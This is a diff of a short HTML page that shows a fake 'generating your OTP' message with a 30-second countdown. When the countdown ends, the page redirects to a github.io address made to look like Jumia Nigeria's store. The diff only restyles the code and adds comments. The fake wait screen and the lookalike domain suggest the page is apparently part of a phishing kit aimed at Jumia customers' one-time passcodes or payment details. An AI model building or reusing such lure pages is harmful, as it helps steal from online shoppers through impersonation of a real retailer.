@@ -1,26 +1,33 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>OTP Countdown</title>
+	<title>OTP Countdown and Redirect</title>
 </head>
 <body>
+	<p>Please wait while we generate your OTP. It will expire in <span id="countdown">30 seconds</span>.</p>
+	<script>
+		window.onload = function() {
+			// Set the countdown time in seconds
+			var countdown = 30;
 
-  <p>Please wait while we generate your OTP. It will expire in <span id="countdown-timer">30 seconds</span>.</p>
+			// Get the countdown element by ID
+			var countdownEl = document.getElementById('countdown');
 
-  <script>
-    window.onload = function() {
-      var countdownElement = document.getElementById("countdown-timer");
-      var countdown = 30;
-      var countdownInterval = setInterval(function() {
-        countdown--;
-        countdownElement.textContent = countdown + " seconds";
-        if (countdown <= 0) {
-          clearInterval(countdownInterval);
-          window.location.href = "https://jumia-ng-electronics-category-nig.github.io/jumia.com.ng/index2.html";
-        }
-      }, 1000);
-    };
-  </script>
+			// Update the countdown element every second
+			var countdownInterval = setInterval(function() {
+				// Decrement the countdown time
+				countdown--;
 
+				// Update the countdown element with the remaining time
+				countdownEl.textContent = countdown + ' seconds';
+
+				// If the countdown reaches zero, redirect to the specified URL
+				if (countdown === 0) {
+					clearInterval(countdownInterval);
+					window.location.href = 'https://jumia-ng-electronics-category-nig.github.io/jumia.com.ng/index2.html';
+				}
+			}, 1000);
+		}
+	</script>
 </body>
 </html>
